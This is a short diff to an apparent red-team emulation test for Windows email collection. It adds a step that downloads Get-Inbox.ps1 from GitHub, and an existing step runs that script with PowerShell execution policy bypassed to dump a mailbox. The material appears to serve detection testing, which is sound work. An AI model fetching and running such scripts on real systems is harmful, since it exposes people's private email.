@@ -24,6 +24,12 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Get-Inbox.ps1 must be located at #{file_path}
+      inline: |
+        if (Test-Path "#{file_path}\Get-Inbox.ps1") {exit 0} else {{Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1" -OutFile "#{file_path}\Get-Inbox.ps1"
+        }}
+      executor: powershell
     - name: email-collection-with-powershell-get-inbox
       inline: |
         powershell -executionpolicy bypass -command "{{.Args.file_path}}\Get-Inbox.ps1" -file {{.Args.output_file}}
